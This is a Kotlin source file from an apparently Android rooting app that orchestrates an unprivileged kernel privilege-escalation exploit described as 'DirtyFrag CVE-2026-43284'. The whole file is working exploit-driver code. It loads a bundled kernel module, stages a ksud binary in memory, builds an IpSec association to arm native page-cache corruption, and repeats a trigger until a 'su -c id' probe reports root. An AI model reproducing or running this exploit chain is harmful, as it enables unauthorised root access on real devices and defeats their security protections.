package com.uniroot.app.newmethod

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import com.snothin.ghostsam.IReporter
import com.snothin.ghostsam.data.exploit.GsdfrAppNative
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom
import java.util.concurrent.TimeUnit

/**
 * NEW METHOD (fast) — the GhostSam 0.2.2 engine, byte-for-byte the flow of
 * the app that roots this phone (manual and at boot). Unprivileged DirtyFrag
 * CVE-2026-43284: IpSecManager allocates the SA, the native arms the kernel
 * page-cache corruption, ksud is late-loaded from a memfd.
 *
 * Sequence (identical to GhostSam lh1.o): progress(0) -> kmi() -> ko bytes
 * (bundled dfr_lkm-<kmi>.ko) -> ksud bytes (flavor) -> ksudStageMemfd ->
 * IpSec SA -> setAllowShell -> arm(...) == "status=ok" -> retry loop
 * (15 x 500 ms: live su probe + trigger()) -> finish(true) (GhostSam never
 * soft-reboots from the engine) -> close SA.
 */
object GhostSamRunner {

    private const val ASSET_PREFIX = "df/ghostsam/payloads"

    /** One full unprivileged root run. Returns 0 = rooted, 1 = engine refused, 2 = error. */
    fun run(
        context: Context,
        ksuNext: Boolean,
        @Suppress("UNUSED_PARAMETER") softReboot: Boolean,
        reporter: IReporter,
        onProgress: (Int, String) -> Unit = { _, _ -> },
    ): Int {
        val n = GsdfrAppNative.a
        var transform: IpSecTransform? = null
        var spiObj: IpSecManager.SecurityParameterIndex? = null
        var encapSock: IpSecManager.UdpEncapsulationSocket? = null
        try {
            onProgress(5, "Initialisation…")
            n.progress(0)
            val kmi = n.kmi()
            if (kmi.isEmpty()) return fail(reporter, onProgress, "cannot read KMI")
            reporter.report("[*] DirtyFrag: kmi=$kmi\n")
            onProgress(12, "KMI noyau : $kmi")

            onProgress(22, "Chargement du module dirtyfrag…")
            val ko = asset(context, "$ASSET_PREFIX/dirtyfrag/dfr_lkm-$kmi.ko")
                ?: return fail(reporter, onProgress, "missing asset dfr_lkm-$kmi.ko (not bundled for this KMI)")
            // Profil ksud Next choisi sur l'accueil (KsudNextProfiles, ex.
            // 3.3.0 / 3.4.0) ; fallback: le ksud Next GhostSam embarqué.
            val ksudAsset = if (ksuNext)
                KsudNextProfiles.selectedAsset(context) ?: "$ASSET_PREFIX/ksud/ksud-next"
            else "$ASSET_PREFIX/ksud/ksud"
            onProgress(30, "Préparation du ksud en mémoire…")
            val ksud = asset(context, ksudAsset)
                ?: return fail(reporter, onProgress, "missing ksud asset: $ksudAsset")

            val memfd = n.ksudStageMemfd(ksud)
            if (memfd.isEmpty()) return fail(reporter, onProgress, "ksud memfd stage failed")
            val variant = if (ksuNext) "NEXT" else "CLASSIC"
            reporter.report("[*] DirtyFrag: ko=${ko.size}B (bundled) ksud=$memfd (${ksud.size}B, $ksudAsset, variant=$variant)\n")

            onProgress(42, "Mise en place de la SA IpSec…")
            val loopback = InetAddress.getByName("127.0.0.1")
            val ipsec = context.getSystemService(Context.IPSEC_SERVICE) as IpSecManager
            val rng = SecureRandom()
            val aesKey = ByteArray(32).also { rng.nextBytes(it) }
            val hmacKey = ByteArray(32).also { rng.nextBytes(it) }
            val senderSock = DatagramSocket()
            val senderPort = senderSock.localPort
            senderSock.close()
            encapSock = ipsec.openUdpEncapsulationSocket()
            spiObj = ipsec.allocateSecurityParameterIndex(loopback)
            transform = IpSecTransform.Builder(context)
                .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
                .setAuthentication(IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128))
                .setIpv4Encapsulation(encapSock, senderPort)
                .buildTransportModeTransform(loopback, spiObj)
            reporter.report(
                String.format("[*] DirtyFrag: sa spi=0x%08x encap=%d sport=%d%n",
                    spiObj.spi, encapSock.port, senderPort))

            n.setAllowShell(false)

            onProgress(58, "Armement de l'exploit…")
            val armOut = n.arm(kmi, ko, spiObj.spi, encapSock.port, senderPort, aesKey, hmacKey, memfd)
            reporter.report(armOut.trimEnd() + "\n")
            if (armOut != "status=ok") {
                runCatching { n.finish(true) }
                return fail(reporter, onProgress, "arm failed")
            }

            // Same probe loop as GhostSam: a live su check, then trigger(),
            // up to 15 tries 500 ms apart. The bar creeps through the tries
            // (60 -> 88) so the wait is VISIBLE, not a frozen jump to 100.
            var triggerOk = false
            var up = false
            for (i in 0 until 15) {
                onProgress((60 + i * 2).coerceAtMost(88), "Root en cours (tentative ${i + 1}/15)…")
                if (suProbe()) {
                    reporter.report("[+] kernelsu=up (su uid=0; app probe)\n")
                    up = true
                    break
                }
                val trig = runCatching { n.trigger() }.getOrElse { it.toString() }
                reporter.report(trig.trimEnd() + "\n")
                if (trig == "kernelsu=up") { up = true; break }
                triggerOk = trig == "status=ok"
                if (!triggerOk) break
                Thread.sleep(500)
            }
            onProgress(94, "Finalisation…")
            runCatching { n.finish(true) }
            if (!up) {
                val why = if (triggerOk) "KernelSU not up after trigger" else "trigger failed"
                return fail(reporter, onProgress, why)
            }
            onProgress(100, "Téléphone rooté ✓")
            return 0
        } catch (t: Throwable) {
            reporter.report("[x] ${t.javaClass.simpleName}: ${t.message}\n")
            runCatching { n.finish(true) }
            onProgress(100, "Erreur")
            return 2
        } finally {
            runCatching { transform?.close() }
            runCatching { spiObj?.close() }
            runCatching { encapSock?.close() }
        }
    }

    /** The live root probe GhostSam runs: su -c id must report uid=0. */
    fun suProbe(): Boolean = runCatching {
        val p = ProcessBuilder("su", "-c", "id").start()
        val done = p.waitFor(3, TimeUnit.SECONDS)
        if (!done) { p.destroy(); return false }
        p.inputStream.bufferedReader().readText().contains("uid=0")
    }.getOrDefault(false)

    private fun asset(context: Context, path: String): ByteArray? =
        runCatching { context.assets.open(path).use { it.readBytes() } }.getOrNull()

    private fun fail(reporter: IReporter, onProgress: (Int, String) -> Unit, why: String): Int {
        reporter.report("[x] $why\n")
        onProgress(100, why)
        return if (why.startsWith("missing") || why.contains("KMI")) 2 else 1
    }
}
